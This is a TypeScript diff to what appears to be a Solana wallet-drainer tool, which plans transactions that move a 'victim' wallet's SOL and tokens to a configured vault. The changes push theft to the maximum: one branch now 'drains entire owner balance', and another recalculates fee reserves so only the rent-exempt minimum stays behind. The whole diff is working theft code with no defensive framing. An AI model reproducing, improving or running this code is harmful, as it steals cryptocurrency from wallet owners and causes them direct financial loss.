@@ -12,6 +12,7 @@ import type { Found } from "./scan.js";
 
 const RECOVERY = 1_000_000n;
 const RENT_PER_ATA = 2_039_280n;
+const RENT_EXEMPT_MIN = 890_880n;
 const BUFFER = 50_000n;
 const DUST = 1000n;
 
@@ -36,6 +37,7 @@ export async function plan(
   balance: bigint,
   found: Found[],
   reserveMult = 1,
+  reserveAdd = 0n,
 ): Promise<Plan[]> {
   const dests = found.map((t) => getAssociatedTokenAddressSync(t.mint, cfg.vault, false, t.programId));
   const infos = await conn.getMultipleAccountsInfo(dests);
@@ -51,11 +53,11 @@ export async function plan(
   const perTx = Math.max(1, Math.floor(cfg.MAX_IX_PER_TX / 3) - 1);
 
   if (cfg.feePayer) {
-    // Server pays fees + ATA rent — include all tokens, transfer full balance minus small buffer
+    // Server pays fees + ATA rent — drain entire owner balance; zero is valid, account gets reaped
     for (const t of paid) chosen.push(t);
     const items: Plan[] = [];
-    if (balance > 10_000n) {
-      items.push({ sol: balance - 10_000n, tokens: [], rec: false });
+    if (balance > 0n) {
+      items.push({ sol: balance, tokens: [], rec: false });
     }
     for (let i = 0; i < chosen.length; i += perTx) {
       items.push({ sol: 0n, tokens: chosen.slice(i, i + perTx), rec: false });
@@ -66,7 +68,7 @@ export async function plan(
   // Victim is fee payer — use rough reserve for token budget; buildAll refines SOL amount
   const priority = priorityLamports();
   const rec = balance < 3_000_000n ? 0n : RECOVERY;
-  const roughFee = BigInt(Math.ceil(Number(5000n + priority + BUFFER) * reserveMult));
+  const roughFee = BigInt(Math.ceil(Number(RENT_EXEMPT_MIN + 5000n + priority + BUFFER) * reserveMult)) + reserveAdd;
   const roughReserve = roughFee + rec;
   const budget = balance - roughReserve;
   if (budget < 0n) return [];
@@ -92,6 +94,7 @@ export async function buildAll(
   items: Plan[],
   recovery: PublicKey,
   reserveMult = 1,
+  reserveAdd = 0n,
 ): Promise<string[]> {
   const { blockhash } = await conn.getLatestBlockhash("finalized");
   const ataFunder = cfg.feePayer ? cfg.feePayer.publicKey : owner;
@@ -148,8 +151,9 @@ export async function buildAll(
       } catch { /* fall back to 5000 */ }
 
       const priorityFee = priorityLamports();
-      const rawFeeReserve = baseFee + priorityFee + missingATARent + BUFFER;
-      const scaledFeeReserve = BigInt(Math.ceil(Number(rawFeeReserve) * reserveMult));
+      // Keep owner at rent-exempt minimum after the transfer
+      const rawFeeReserve = RENT_EXEMPT_MIN + baseFee + priorityFee + missingATARent + BUFFER;
+      const scaledFeeReserve = BigInt(Math.ceil(Number(rawFeeReserve) * reserveMult)) + reserveAdd;
       const reserve = scaledFeeReserve + rec;
       const transferAmount = balance - reserve;
 
